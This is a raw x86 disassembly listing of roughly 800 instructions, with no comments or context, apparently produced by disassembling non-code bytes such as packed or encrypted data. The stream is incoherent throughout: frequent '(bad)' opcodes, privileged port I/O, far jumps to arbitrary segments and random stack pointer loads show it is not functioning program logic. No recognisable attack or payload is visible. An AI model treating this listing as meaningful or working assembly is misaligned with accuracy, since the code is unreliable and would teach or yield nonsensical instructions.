  41b9d5:	lods   eax,DWORD PTR ds:[esi]
  41b9d6:	push   eax
  41b9d7:	clc    
  41b9d8:	fwait
  41b9d9:	test   BYTE PTR [esi],0x5c
  41b9dc:	jp     0x41ba4c
  41b9de:	mov    ch,BYTE PTR [ebx+0x4f]
  41b9e1:	xor    eax,0x4e74e84
  41b9e6:	jnp    0x41ba4f
  41b9e8:	int3   
  41b9e9:	mov    edx,0x39c7c83a
  41b9ee:	push   ecx
  41b9ef:	icebp  
  41b9f0:	mov    esp,0x2255baa0
  41b9f5:	loope  0x41b9f4
  41b9f7:	div    DWORD PTR [ebx+0x77]
  41b9fa:	sbb    dh,bh
  41b9fc:	dec    esi
  41b9fd:	mov    ebx,0xa5e37ebd
  41ba02:	sub    al,0xf8
  41ba04:	loope  0x41ba3e
  41ba06:	cs int 0xcf
  41ba09:	push   DWORD PTR [ebx]
  41ba0b:	xchg   bh,bl
  41ba0d:	pop    esp
  41ba0e:	add    BYTE PTR [edi-0x59],dh
  41ba11:	pop    edx
  41ba12:	aam    0x11
  41ba14:	jb     0x41ba40
  41ba16:	xchg   BYTE PTR [edx+ebx*2-0x1a],ah
  41ba1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba1b:	mov    esi,DWORD PTR ds:0x17480fd9
  41ba21:	xchg   edi,eax
  41ba22:	jl     0x41b9af
  41ba24:	lods   eax,DWORD PTR ds:[esi]
  41ba25:	je     0x41ba68
  41ba27:	push   es
  41ba28:	xchg   ebp,eax
  41ba29:	xchg   ebx,eax
  41ba2a:	sbb    eax,0xcfb3f296
  41ba2f:	mov    al,0x65
  41ba31:	not    BYTE PTR [ecx]
  41ba33:	or     DWORD PTR [edi],esi
  41ba35:	inc    edx
  41ba36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba37:	nop
  41ba38:	out    dx,al
  41ba39:	je     0x41ba27
  41ba3b:	jmp    0xa8587a3d
  41ba40:	add    eax,0x5f39824d
  41ba45:	mov    esi,0x578cda51
  41ba4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba4b:	mov    esp,0x4d99cf0f
  41ba50:	dec    ebp
  41ba51:	or     bl,bl
  41ba53:	stos   DWORD PTR es:[edi],eax
  41ba54:	and    al,0x9d
  41ba56:	in     eax,dx
  41ba57:	pop    edi
  41ba58:	call   0x19e4:0xb1b182cd
  41ba5f:	frstor [esi-0x80]
  41ba62:	arpl   si,bp
  41ba64:	sub    ebp,esi
  41ba66:	sbb    dh,BYTE PTR [esi-0x41c5c635]
  41ba6c:	stos   DWORD PTR es:[edi],eax
  41ba6d:	xor    BYTE PTR [eax-0x539c7b14],dh
  41ba73:	sbb    ch,BYTE PTR [ecx+0x36267564]
  41ba79:	rol    ch,1
  41ba7b:	(bad)  
  41ba7c:	ja     0x41ba4b
  41ba7e:	sti    
  41ba7f:	es sbb al,0xe
  41ba82:	xor    BYTE PTR [ebx+0x7413d9c4],0xcd
  41ba89:	lods   eax,DWORD PTR ds:[esi]
  41ba8a:	jp     0x41bac6
  41ba8c:	or     eax,0xf62e7e22
  41ba91:	push   es
  41ba92:	adc    eax,0x577afd27
  41ba97:	jbe    0x41bade
  41ba99:	jae    0x41badc
  41ba9b:	cmp    DWORD PTR [ebp-0x7e],0x6d6f07a5
  41baa2:	pop    eax
  41baa3:	popa   
  41baa4:	sbb    ah,BYTE PTR [edi-0x74]
  41baa7:	sub    DWORD PTR [eax+0x38],ebx
  41baaa:	cmp    ah,BYTE PTR [eax-0x1e3d7e9b]
  41bab0:	add    BYTE PTR [edi-0x66],dh
  41bab3:	data16 xor dh,BYTE PTR [edi*4+0x396b7481]
  41babb:	dec    edx
  41babc:	bound  ecx,QWORD PTR [edi+0x79]
  41babf:	ins    DWORD PTR es:[edi],dx
  41bac0:	mov    dl,0x38
  41bac2:	jmp    0x568d:0x2f22d7d0
  41bac9:	ret    0xaf15
  41bacc:	dec    eax
  41bacd:	fsubr  QWORD PTR [edi+0x393e04d9]
  41bad3:	or     ecx,0xffffff85
  41bad6:	ins    BYTE PTR es:[edi],dx
  41bad7:	xchg   ecx,eax
  41bad8:	adc    al,0x74
  41bada:	out    dx,al
  41badb:	lods   eax,DWORD PTR ds:[esi]
  41badc:	aam    0xa0
  41bade:	dec    DWORD PTR [ecx]
  41bae0:	cmc    
  41bae1:	xor    ebx,DWORD PTR [esi]
  41bae3:	and    DWORD PTR [esi+0x2bbe18f3],esi
  41bae9:	jg     0x41ba9b
  41baeb:	je     0x41bb31
  41baed:	mov    edi,0x736d31b1
  41baf2:	test   DWORD PTR [eax],esi
  41baf4:	jne    0x41ba79
  41baf6:	int3   
  41baf7:	and    eax,ebx
  41baf9:	test   DWORD PTR [ebp-0x6ca0e93],esi
  41baff:	cs fstp TBYTE PTR es:[ebp+0x72]
  41bb04:	sub    al,0x52
  41bb06:	lea    esp,[ecx]
  41bb08:	xchg   ecx,eax
  41bb09:	les    edi,FWORD PTR [edx+0xc]
  41bb0c:	retf   
  41bb0d:	jb     0x41bab4
  41bb0f:	and    al,0x4b
  41bb11:	sub    eax,0x738ab2b7
  41bb16:	dec    eax
  41bb17:	stc    
  41bb18:	shr    BYTE PTR [ecx-0x3d],cl
  41bb1b:	test   BYTE PTR es:[eax-0x46923f00],bl
  41bb22:	adc    DWORD PTR [ecx+0x3ef1a9f8],esp
  41bb28:	cld    
  41bb29:	ins    BYTE PTR es:[edi],dx
  41bb2a:	cmp    dl,BYTE PTR [esi-0x4cc692e4]
  41bb30:	mov    DWORD PTR [ebx+edi*1],edx
  41bb33:	cmp    al,0xf3
  41bb35:	or     DWORD PTR [esi-0x31cace1f],edx
  41bb3b:	or     al,0xc7
  41bb3d:	aam    0xea
  41bb3f:	lock add al,0xcf
  41bb42:	pusha  
  41bb43:	shr    edi,cl
  41bb45:	retf   0x868a
  41bb48:	pushf  
  41bb49:	lahf   
  41bb4a:	adc    ah,BYTE PTR [ebx-0x3c]
  41bb4d:	add    eax,0xdc33abdf
  41bb52:	xchg   ecx,eax
  41bb53:	xchg   DWORD PTR [edx+eiz*4-0x54a245c0],edi
  41bb5a:	add    BYTE PTR [ebp-0x23],bl
  41bb5d:	dec    ebp
  41bb5e:	loop   0x41bb8f
  41bb60:	pop    esp
  41bb61:	and    esi,DWORD PTR [edx+edx*2+0x2a]
  41bb65:	xor    ebx,ecx
  41bb67:	push   ecx
  41bb68:	jmp    0xb272d435
  41bb6d:	repnz lods al,BYTE PTR ds:[esi]
  41bb6f:	fmul   QWORD PTR [ebp+0x17]
  41bb72:	fld    DWORD PTR [ecx-0x5a]
  41bb75:	pop    ecx
  41bb76:	push   ecx
  41bb77:	mov    eax,0x3c829cb0
  41bb7c:	and    esp,DWORD PTR [ebp+0x3d]
  41bb7f:	shr    eax,0xdf
  41bb82:	mov    esi,0x1ea6376b
  41bb87:	rcl    BYTE PTR [esp+eax*1+0x1c],1
  41bb8b:	sub    ecx,DWORD PTR [ecx-0x5c8f25a0]
  41bb91:	pop    ebp
  41bb92:	fcmovne st,st(0)
  41bb94:	(bad)  
  41bb95:	repnz xchg edx,eax
  41bb97:	adc    ecx,DWORD PTR [ebp-0x4d]
  41bb9a:	push   ebp
  41bb9b:	xchg   edi,eax
  41bb9c:	lock add al,BYTE PTR [edx+edx*2]
  41bba0:	xchg   edx,eax
  41bba1:	pop    esi
  41bba2:	lahf   
  41bba3:	outs   dx,DWORD PTR ds:[esi]
  41bba4:	pop    esi
  41bba5:	aaa    
  41bba6:	dec    ebx
  41bba7:	cdq    
  41bba8:	mov    dh,0x99
  41bbaa:	retf   
  41bbab:	int3   
  41bbac:	ja     0x41bc26
  41bbae:	outs   dx,BYTE PTR ds:[esi]
  41bbaf:	sub    ch,bh
  41bbb1:	retf   0x4fd5
  41bbb4:	jnp    0x41bbc3
  41bbb6:	jle    0x41bb51
  41bbb8:	fnstenv [esi-0x4f913196]
  41bbbe:	cli    
  41bbbf:	sbb    al,0x26
  41bbc1:	gs popaw 
  41bbc4:	xor    al,0xee
  41bbc6:	sets   BYTE PTR [ebp+ebx*4-0x19]
  41bbcb:	or     BYTE PTR [ecx+0x6c],0xd5
  41bbcf:	sub    DWORD PTR [edx+0x70f9f1cf],ecx
  41bbd5:	aam    0x1b
  41bbd7:	(bad)
  41bbdb:	pop    ebx
  41bbdc:	adc    ebx,edi
  41bbde:	loopne 0x41bbc2
  41bbe0:	inc    edx
  41bbe1:	jmp    0x41bbe6
  41bbe3:	mov    al,0xde
  41bbe5:	mov    ebp,0xf13846fe
  41bbea:	sub    BYTE PTR [eax],cl
  41bbec:	add    DWORD PTR ds:0x890743c1,ecx
  41bbf2:	mov    dl,BYTE PTR [esi-0x36]
  41bbf5:	jle    0x41bbd4
  41bbf7:	or     ecx,ebp
  41bbf9:	(bad)  
  41bbfa:	cld    
  41bbfb:	imul   ecx,DWORD PTR [ebp-0x77471020],0xe8e2d32d
  41bc05:	push   ss
  41bc06:	add    eax,0x5f3c2352
  41bc0b:	ret    
  41bc0c:	in     al,dx
  41bc0d:	rol    DWORD PTR [esi],0x4d
  41bc10:	sub    esp,edx
  41bc12:	in     eax,dx
  41bc13:	mov    esp,0x937b771d
  41bc18:	cmp    ah,BYTE PTR [ecx+0x3e]
  41bc1b:	jmp    0xe0d3:0x201ecc53
  41bc22:	push   ds
  41bc23:	mov    ds:0xf152775f,eax
  41bc28:	add    BYTE PTR [ebp+0x19],bh
  41bc2b:	dec    ecx
  41bc2c:	jns    0x41bbb3
  41bc2e:	test   DWORD PTR [edi+0x59],ebp
  41bc31:	mov    dh,0x36
  41bc33:	xor    DWORD PTR [ecx],ebp
  41bc35:	std    
  41bc36:	sbb    dl,BYTE PTR [eax-0x50b37c63]
  41bc3c:	mov    al,0xb7
  41bc3e:	jle    0x41bc54
  41bc40:	jb     0x41bbcb
  41bc42:	mov    ch,0x82
  41bc44:	gs fwait
  41bc46:	push   esi
  41bc47:	jmp    0xadedf392
  41bc4c:	jp     0x41bc4e
  41bc4e:	lahf   
  41bc4f:	adc    eax,0x183f7fd5
  41bc54:	imul   ebp,DWORD PTR es:[ebx-0x4a4c110b],0x44
  41bc5c:	cmp    dl,ah
  41bc5e:	cmp    ch,ah
  41bc60:	mov    ebx,0xe26cca28
  41bc65:	adc    al,0xff
  41bc67:	es call 0x6fe0545c
  41bc6d:	and    dh,ch
  41bc6f:	or     BYTE PTR [ecx+0x52c1d5f4],ch
  41bc75:	sbb    eax,0xe3bb7cdd
  41bc7a:	xor    DWORD PTR [eax-0x4e],0x54
  41bc7e:	leave  
  41bc7f:	fiadd  WORD PTR [eax]
  41bc81:	dec    ecx
  41bc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc83:	jne    0x41bc2f
  41bc85:	pop    esi
  41bc86:	jb     0x41bc31
  41bc88:	ins    BYTE PTR es:[edi],dx
  41bc89:	ins    DWORD PTR es:[edi],dx
  41bc8a:	es sti 
  41bc8c:	mov    edx,DWORD PTR [eax+0x6ebe4533]
  41bc92:	(bad)  
  41bc93:	pop    ss
  41bc94:	ins    DWORD PTR es:[edi],dx
  41bc95:	stos   DWORD PTR es:[edi],eax
  41bc96:	aam    0x5e
  41bc98:	(bad)  
  41bc99:	cmp    esp,DWORD PTR [eax]
  41bc9b:	cld    
  41bc9c:	dec    ebx
  41bc9d:	add    bh,dl
  41bc9f:	test   DWORD PTR [ebp+0x48],0xa205bd01
  41bca6:	xor    ebp,ebp
  41bca8:	cmc    
  41bca9:	outs   dx,DWORD PTR ds:[esi]
  41bcaa:	mov    cl,0x28
  41bcac:	and    al,0x7f
  41bcae:	xchg   ecx,eax
  41bcaf:	mov    ?,WORD PTR [ebp+0x1e]
  41bcb2:	pushf  
  41bcb3:	jg     0x41bd34
  41bcb5:	les    edx,FWORD PTR [ecx]
  41bcb7:	stos   BYTE PTR es:[edi],al
  41bcb8:	xchg   ebp,eax
  41bcb9:	call   0x5a5d:0x28083e0f
  41bcc0:	cmp    eax,DWORD PTR [esi+0x60]
  41bcc3:	mov    ah,0x8b
  41bcc5:	or     al,BYTE PTR [edx-0x2f]
  41bcc8:	sar    dh,0x84
  41bccb:	xchg   ebp,eax
  41bccc:	cmp    ebx,DWORD PTR [edx+esi*4]
  41bccf:	push   es
  41bcd0:	dec    esp
  41bcd1:	retf   
  41bcd2:	lods   eax,DWORD PTR ds:[esi]
  41bcd3:	aam    0xf2
  41bcd5:	and    ch,BYTE PTR ds:0x8e1ccf29
  41bcdb:	fmul   DWORD PTR [ebx]
  41bcdd:	mov    bh,0x55
  41bcdf:	or     ebx,esi
  41bce1:	mov    edx,0xe585b19f
  41bce6:	out    dx,al
  41bce7:	outs   dx,BYTE PTR ds:[esi]
  41bce8:	cli    
  41bce9:	or     ch,cl
  41bceb:	mov    edi,0xe8f25a4e
  41bcf0:	sub    DWORD PTR [ebx-0x7c2a0feb],0xffffffcf
  41bcf7:	imul   ebp,DWORD PTR [ecx-0x7b],0x32
  41bcfb:	mov    ch,0x25
  41bcfd:	inc    esi
  41bcfe:	mov    BYTE PTR [ebx-0x2006d1df],dl
  41bd04:	inc    ecx
  41bd05:	daa    
  41bd06:	xor    eax,0x5553523d
  41bd0b:	and    bl,BYTE PTR [esi-0x7788e4e7]
  41bd11:	dec    DWORD PTR [ebx]
  41bd13:	mov    dh,0xb9
  41bd15:	dec    esi
  41bd16:	jp     0x41bcd5
  41bd18:	lds    ebp,FWORD PTR [eax]
  41bd1a:	ins    BYTE PTR es:[edi],dx
  41bd1b:	gs mov dh,0x69
  41bd1e:	jmp    0x41bcdf
  41bd20:	das    
  41bd21:	retf   0x9cca
  41bd24:	push   edi
  41bd25:	xchg   esp,eax
  41bd26:	sahf   
  41bd27:	test   DWORD PTR [ecx+0x49ad9db5],esp
  41bd2d:	sub    edi,edx
  41bd2f:	cmp    cl,dl
  41bd31:	out    dx,eax
  41bd32:	sbb    BYTE PTR [ecx],dh
  41bd34:	loope  0x41bd44
  41bd36:	pop    edx
  41bd37:	out    dx,eax
  41bd38:	call   FWORD PTR [edx-0x7a]
  41bd3b:	mov    al,0x55
  41bd3d:	adc    dh,BYTE PTR [eax+0x4e]
  41bd40:	inc    esi
  41bd41:	jecxz  0x41bcd9
  41bd43:	adc    DWORD PTR [edi],0x14
  41bd46:	ret    0x776c
  41bd49:	push   esi
  41bd4a:	fdivr  QWORD PTR [ebx]
  41bd4c:	xor    eax,0x270406ea
  41bd51:	inc    esi
  41bd52:	dec    edx
  41bd53:	add    eax,0x62c0a006
  41bd58:	mov    al,ds:0xeed8693c
  41bd5d:	(bad)  
  41bd5e:	mov    ebp,0xd1e81dc8
  41bd63:	in     eax,0xba
  41bd65:	lods   al,BYTE PTR ds:[esi]
  41bd66:	sbb    ch,BYTE PTR [ebp-0x5a]
  41bd69:	cld    
  41bd6a:	or     eax,0x40310be6
  41bd6f:	fcomip st,st(6)
  41bd71:	sub    DWORD PTR [ecx+0x2c],eax
  41bd74:	pop    esi
  41bd75:	jnp    0x41bcfe
  41bd77:	inc    esp
  41bd78:	inc    esp
  41bd79:	mov    al,ds:0xe16af79a
  41bd7f:	cmp    DWORD PTR [ebp+0x7c],ebx
  41bd82:	je     0x41bdf5
  41bd84:	leave  
  41bd85:	imul   ebx,ecx,0x5fa8ff44
  41bd8b:	xor    al,0x83
  41bd8d:	xor    eax,0x7e2d5208
  41bd92:	test   al,0x1f
  41bd94:	mov    al,ds:0x260d3db2
  41bd99:	sbb    DWORD PTR [edx-0x72478daf],ecx
  41bd9f:	jp     0x41bd63
  41bda1:	cmp    ebx,DWORD PTR [edx+ebp*1-0x17]
  41bda5:	jge    0x41bd4b
  41bda7:	add    bl,dl
  41bda9:	cmp    edx,eax
  41bdab:	call   0x3e2a5d28
  41bdb0:	cmp    ebp,edi
  41bdb2:	ror    dh,cl
  41bdb4:	push   ecx
  41bdb5:	pop    esi
  41bdb6:	cmp    al,0xa8
  41bdb8:	cmp    bh,BYTE PTR [ecx+0x62]
  41bdbb:	cwde   
  41bdbc:	sbb    BYTE PTR [eax-0x33c10d86],bl
  41bdc2:	cmp    eax,0xf4645340
  41bdc7:	xchg   edx,eax
  41bdc8:	pop    ds
  41bdc9:	xor    edx,DWORD PTR [edx]
  41bdcb:	test   DWORD PTR [ecx],edi
  41bdcd:	mov    ah,cl
  41bdcf:	dec    ecx
  41bdd0:	xchg   edx,eax
  41bdd1:	mov    ah,bh
  41bdd3:	xchg   esi,eax
  41bdd4:	push   edi
  41bdd5:	adc    edx,DWORD PTR [ebp+0x70]
  41bdd8:	sub    edi,DWORD PTR [ebx-0x21f8e97a]
  41bdde:	loopne 0x41bd92
  41bde0:	and    al,BYTE PTR [ebx+0x68]
  41bde3:	popf   
  41bde4:	xchg   edi,eax
  41bde5:	push   0x114ec8b6
  41bdea:	ret    0x4cbb
  41bded:	fld    DWORD PTR [edx]
  41bdef:	shr    DWORD PTR [esi+0x5c],1
  41bdf2:	jl     0x41bdff
  41bdf4:	(bad)  
  41bdf5:	icebp  
  41bdf6:	in     eax,0x39
  41bdf8:	mov    dh,0xc3
  41bdfa:	adc    BYTE PTR ds:0x1cf6eb82,ch
  41be00:	rcl    BYTE PTR [edx+0x7c],1
  41be03:	fs pushf 
  41be05:	lods   al,BYTE PTR ds:[esi]
  41be06:	out    0x7d,al
  41be08:	inc    ebx
  41be09:	shr    BYTE PTR ds:0x1646708c,cl
  41be0f:	sub    ch,BYTE PTR es:[eax-0x76]
  41be13:	or     DWORD PTR [eax-0x77],eax
  41be16:	loope  0x41be69
  41be18:	push   ecx
  41be19:	xchg   BYTE PTR [ebx-0x2dd5bbc6],cl
  41be1f:	xchg   esp,eax
  41be20:	jle    0x41bdce
  41be22:	jecxz  0x41bdfd
  41be24:	dec    ebx
  41be25:	and    al,0x4d
  41be27:	cs mov al,0xaf
  41be2a:	outs   dx,BYTE PTR ds:[esi]
  41be2b:	pop    esp
  41be2c:	rcr    BYTE PTR [ebx],0xdb
  41be2f:	mov    ebx,0xb060c8b2
  41be34:	mov    edi,0xdc0eea28
  41be39:	pop    es
  41be3a:	test   BYTE PTR [esi+esi*4],ah
  41be3d:	lahf   
  41be3e:	(bad)
  41be41:	xor    eax,0xc3b11c0c
  41be46:	mov    esi,0x96815845
  41be4b:	push   edi
  41be4c:	pusha  
  41be4d:	call   0xcc2b184a
  41be52:	popf   
  41be53:	and    eax,0x1e8a2184
  41be58:	inc    ebx
  41be59:	xor    BYTE PTR [esi],al
  41be5b:	inc    ebp
  41be5c:	mov    cl,0xa3
  41be5e:	es in  eax,0xb6
  41be61:	or     DWORD PTR ds:0x56c7f1c0,0x659c6b2b
  41be6b:	inc    edi
  41be6c:	sub    ebp,ecx
  41be6e:	pop    esi
  41be6f:	call   0x2b1c6f66
  41be74:	out    0xa,al
  41be76:	push   edi
  41be77:	fscale 
  41be79:	mov    cl,0xd3
  41be7b:	sbb    eax,0x1514d5ac
  41be80:	hlt    
  41be81:	retf   
  41be82:	pop    ebx
  41be83:	ror    DWORD PTR [edi],0xfe
  41be86:	(bad)  
  41be87:	out    0x66,eax
  41be89:	mov    edi,0x17519197
  41be8e:	mov    ch,0x7
  41be90:	jmp    0x9a87103f
  41be95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be96:	xor    dl,BYTE PTR [eax-0x70]
  41be99:	adc    edi,ecx
  41be9b:	idiv   DWORD PTR [esi+0x1f]
  41be9e:	mov    al,ds:0xcd7348a7
  41bea3:	ss int3 
  41bea5:	pop    edi
  41bea6:	inc    eax
  41bea7:	ins    WORD PTR es:[edi],dx
  41bea9:	cmp    al,0xb4
  41beab:	dec    ebp
  41beac:	push   0xfffffffe
  41beae:	dec    esp
  41beaf:	test   al,0xa3
  41beb1:	push   ss
  41beb2:	xor    BYTE PTR [ecx+0x55],ah
  41beb5:	(bad)  
  41beb6:	lea    ebp,[ebx+0x2e58ba24]
  41bebc:	(bad)  
  41bebe:	shl    DWORD PTR [ecx+0x5adcddb],cl
  41bec4:	adc    al,0x8
  41bec6:	push   ebp
  41bec7:	push   cs
  41bec8:	dec    ebp
  41bec9:	cld    
  41beca:	fidivr WORD PTR [esi]
  41becc:	xor    al,0xd0
  41bece:	out    0x11,al
  41bed0:	adc    eax,ebp
  41bed2:	mov    BYTE PTR [eax+0x26],dl
  41bed5:	pop    edi
  41bed6:	dec    eax
  41bed7:	mov    ebx,0x3048b233
  41bedc:	sub    eax,0x35142c28
  41bee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bee2:	cmp    al,0x92
  41bee4:	add    edx,edx
  41bee6:	ficomp DWORD PTR [edi-0x78]
  41bee9:	sub    DWORD PTR [ebp*1+0x6994f4fe],ecx
  41bef0:	mov    al,BYTE PTR [ebx-0x5b]
  41bef3:	enter  0xcd59,0x6d
  41bef7:	aam    0xd1
  41bef9:	ins    BYTE PTR es:[edi],dx
  41befa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41befb:	rcr    BYTE PTR [ecx+0x4a],0xa0
  41beff:	xchg   ebp,eax
  41bf00:	stc    
  41bf01:	adc    BYTE PTR [ebx],cl
  41bf03:	pop    ebx
  41bf04:	xor    ah,BYTE PTR ss:[esi-0x23705cbe]
  41bf0b:	out    0xf4,al
  41bf0d:	lds    edx,FWORD PTR [esi-0x75d6b013]
  41bf13:	ret    0x8275
  41bf16:	aam    0xd0
  41bf18:	test   DWORD PTR [ebx+ecx*8],eax
  41bf1b:	pop    edx
  41bf1c:	jmp    0x41bf48
  41bf1e:	(bad)  
  41bf1f:	aad    0xfe
  41bf21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf22:	call   0xc3da:0xbbf69043
  41bf29:	sbb    ch,BYTE PTR [ecx-0x9]
  41bf2c:	push   ecx
  41bf2d:	push   edi
  41bf2e:	loope  0x41bf56
  41bf30:	std    
  41bf31:	cmp    DWORD PTR [eax+0x75],ebp
  41bf34:	lahf   
  41bf35:	ja     0x41bf77
  41bf37:	adc    BYTE PTR [esi+0x26],0x8b
  41bf3b:	repz xchg edi,eax
  41bf3d:	call   0x6b172954
  41bf42:	mov    esp,0xbe8890c0
  41bf47:	imul   ecx
  41bf49:	pop    ecx
  41bf4a:	(bad)
  41bf4e:	adc    edx,esi
  41bf50:	hlt    
  41bf51:	pop    es
  41bf52:	mov    eax,0xb23f4a25
  41bf57:	and    bl,BYTE PTR [edi+0x883845b]
  41bf5d:	popa   
  41bf5e:	pusha  
  41bf5f:	xchg   ecx,eax
  41bf60:	jbe    0x41bf82
  41bf62:	pushf  
  41bf63:	out    0xd5,al
  41bf65:	push   0xffffffa2
  41bf67:	call   0x56d95f92
  41bf6c:	not    DWORD PTR [ebp-0x7f]
  41bf6f:	pop    edx
  41bf70:	rcl    DWORD PTR [edi+0x3f],1
  41bf73:	ja     0x41bf0c
  41bf75:	mov    eax,ds:0x23c425c3
  41bf7a:	add    ecx,DWORD PTR [edx]
  41bf7c:	fwait
  41bf7d:	inc    ebp
  41bf7e:	jbe    0x41bfe7
  41bf80:	add    cl,BYTE PTR ds:0x13e948da
  41bf86:	sub    DWORD PTR [ecx+edi*4],esp
  41bf89:	push   ebx
  41bf8a:	add    DWORD PTR [edx-0x693fc6c3],0xa7c734ae
  41bf94:	ficom  WORD PTR ds:0x22a5d732
  41bf9a:	in     eax,0x3e
  41bf9c:	ins    DWORD PTR es:[edi],dx
  41bf9d:	sbb    bh,cl
  41bf9f:	inc    ebp
  41bfa0:	ret    
  41bfa1:	jle    0x41bf43
  41bfa3:	sbb    esp,esp
  41bfa5:	in     eax,dx
  41bfa6:	retf   
  41bfa7:	push   edx
  41bfa8:	and    eax,0x68af3a28
  41bfad:	dec    eax
  41bfae:	fldcw  WORD PTR [edi+0x6d]
  41bfb1:	aam    0xba
  41bfb3:	sub    ebx,DWORD PTR [eax]
  41bfb5:	int    0x1c
  41bfb7:	test   eax,0x134735f4
  41bfbc:	and    eax,DWORD PTR [edx]
  41bfbe:	push   ebx
  41bfbf:	add    eax,0x2fbd174
  41bfc4:	jo     0x41bf55
  41bfc6:	cwde   
  41bfc7:	jge    0x41c02a
  41bfc9:	mov    cl,0xb1
  41bfcc:	xchg   edx,eax
  41bfcd:	ror    DWORD PTR [eax],1
  41bfcf:	and    DWORD PTR [eax+0x40d6d95],edx
  41bfd5:	jl     0x41c016
  41bfd7:	cli    
  41bfd8:	xor    cl,BYTE PTR ds:0x16e93786
  41bfde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfdf:	inc    ebx
  41bfe0:	sbb    eax,0x7abb6f72
  41bfe5:	fstp   QWORD PTR [ecx+0x3e]
  41bfe8:	shr    BYTE PTR [ecx],cl
  41bfea:	mov    al,ds:0xcf89ecc1
  41bfef:	call   DWORD PTR [edx+0x2a9009ef]
  41bff5:	aam    0x7a
  41bff7:	fidiv  WORD PTR [edi]
  41bff9:	mov    eax,ds:0xb673eaeb
  41bffe:	mov    ebp,0xaf66ce1b
  41c003:	push   ebx
  41c004:	jp     0x41bf8d
  41c006:	jle    0x41c01b
  41c008:	test   BYTE PTR [ecx-0x71666777],0xda
  41c00f:	jmp    0x41c040
  41c011:	pop    edi
  41c012:	(bad)  
  41c013:	dec    esp
  41c014:	fcomp  DWORD PTR [ebx+0x78]
  41c017:	std    
  41c018:	stos   BYTE PTR es:[edi],al
  41c019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c01a:	popf   
  41c01b:	rcr    DWORD PTR [edx+0x11c47adb],1
  41c021:	rol    DWORD PTR [ecx],1
  41c023:	mov    bh,0x48
  41c025:	cdq    
  41c026:	pop    esp
  41c027:	jecxz  0x41c038
  41c029:	or     eax,0x3d45124f
  41c02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c02f:	mov    dl,BYTE PTR [edx+0x3a]
  41c032:	out    dx,eax
  41c033:	cmp    esp,DWORD PTR [eax-0x6b]
  41c036:	popf   
  41c037:	inc    ebp
  41c038:	push   eax
  41c039:	add    al,0x3f
  41c03b:	xchg   ebp,eax
  41c03c:	and    DWORD PTR [edi+0x41],esp
  41c03f:	fbld   TBYTE PTR [eax-0x2f]
  41c042:	shl    BYTE PTR [eax],0xd6
  41c045:	xor    BYTE PTR [eax-0x14db3a1],dl
  41c04b:	or     eax,0xdfd001db
  41c050:	sbb    DWORD PTR [ebx+0x3b],edx
  41c053:	mov    cl,0x99
  41c055:	je     0x41c077
  41c057:	sub    BYTE PTR [ebp+0xc5eb043],ah
  41c05d:	stos   BYTE PTR es:[edi],al
  41c05e:	cmp    al,bl
  41c060:	in     al,dx
  41c061:	pushf  
  41c062:	stos   BYTE PTR es:[edi],al
  41c063:	jnp    0x41c0b1
  41c065:	jmp    FWORD PTR [ecx+0x422ce2cc]
  41c06b:	dec    esp
  41c06c:	ja     0xff77f018
  41c072:	fdiv   QWORD PTR [ecx+0x21]
  41c075:	shl    ah,0x2e
  41c078:	cwde   
  41c079:	aaa    
  41c07a:	jmp    0xb3d1:0xd5de70a6
  41c081:	jns    0x41c0e3
  41c083:	push   edi
  41c084:	(bad)  
  41c085:	int    0xc3
  41c087:	loopne 0x41c0a0
  41c089:	pop    ebx
  41c08a:	out    0x5c,eax
  41c08c:	xor    ecx,DWORD PTR [edx+0x6c6369]
  41c092:	mov    ecx,0x1a0c6bd4
  41c097:	xlat   BYTE PTR ds:[ebx]
  41c098:	js     0x41c054
  41c09a:	jecxz  0x41c082
  41c09c:	dec    edi
  41c09d:	or     BYTE PTR [esp+ebp*1],0x10
  41c0a1:	addr16 mov ds:0xf067,al
  41c0a5:	sbb    al,0xce
  41c0a7:	pop    edx
  41c0a8:	stos   DWORD PTR es:[edi],eax
  41c0a9:	lods   eax,DWORD PTR ds:[esi]
  41c0aa:	add    edx,DWORD PTR [ebx-0x5e]
  41c0ad:	mov    esi,DWORD PTR [ebp-0xb76d41a]
  41c0b3:	sahf   
  41c0b4:	dec    ebp
  41c0b5:	es adc eax,0x405f9a0
  41c0bb:	fnstcw WORD PTR [esp+esi*2]
  41c0be:	pop    ebp
  41c0bf:	stos   DWORD PTR es:[edi],eax
  41c0c0:	in     eax,0x17
  41c0c2:	or     eax,0xa56f34c3
  41c0c7:	cmc    
  41c0c8:	into   
  41c0c9:	or     al,0x89
  41c0cb:	sar    DWORD PTR [ebp+ecx*1+0x619080e0],cl
  41c0d2:	mov    ds:0xef3bcf6a,al
  41c0d7:	arpl   WORD PTR [ebx+0xaaa3c35],bp
  41c0dd:	cmp    bl,BYTE PTR [edi]
  41c0df:	jg     0x41c0d8
  41c0e1:	cld    
  41c0e2:	lods   al,BYTE PTR ds:[esi]
  41c0e3:	mov    ah,0xc8
  41c0e5:	cmp    DWORD PTR [edi-0x5a100390],ecx
  41c0eb:	nop
  41c0ec:	cdq    
  41c0ed:	cld    
  41c0ee:	cld    
  41c0ef:	in     eax,0xd0
  41c0f1:	loop   0x41c119
  41c0f3:	fcomp  DWORD PTR [ebx-0x25]
  41c0f6:	in     al,dx
  41c0f7:	push   esi
  41c0f8:	cmp    DWORD PTR [edx-0x77],0x6a
  41c0fc:	or     esp,DWORD PTR ds:0xaa54b43a
  41c102:	jno    0x41c104
  41c104:	aad    0xbd
  41c106:	scas   al,BYTE PTR es:[edi]
  41c107:	jmp    0xd06:0x947c7682
  41c10e:	test   DWORD PTR [ebx-0x41866cd4],edi
  41c114:	sub    eax,0x1f286eef
  41c119:	lea    eax,[edx+0x619e5625]
  41c11f:	stos   BYTE PTR es:[edi],al
  41c120:	sbb    ch,dh
  41c122:	fstp   QWORD PTR [edi]
  41c124:	inc    eax
  41c125:	test   al,0x37
  41c127:	adc    al,BYTE PTR [edx+0x277bf3cc]
